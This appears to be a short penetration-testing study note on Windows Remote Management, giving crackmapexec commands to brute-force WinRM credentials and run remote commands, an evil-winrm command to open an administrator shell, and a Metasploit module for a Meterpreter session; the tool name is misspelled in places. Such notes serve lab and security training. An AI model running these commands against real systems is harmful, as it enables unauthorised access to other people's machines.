- **tags:** #WinRM
---------------------------
# WinRM
Windows Remote Management (*WinRM*) is a Windows remote management protocol that can be used to facilitate remote access with Windows system over HTTP(s). WinRM typically uses TCP port *5985* and *5986* (HTTPs).
# Brute Force Attack
We are going to use *crackmapexec* to perform a brute-force attack on the target.
```
cracmapexec winrm <ip> -u username/wordlist -p wordlist
```
We can also take advantage of *crackmapexec* to execute commands on the target system.
```bash
cracmapexec winrm <ip> -u username -p password -x "command"
```
Having found the correct credentials it is now time to obtain a shell using a tool called *evil-winrm*:
```bash
evil-winrm.rb -u administrator -p 'password' -i ip
```
Finally, we can also use *Metasploit* to gain a *Meterpreter* using the `windows/winrm/winrm_script_exec` module.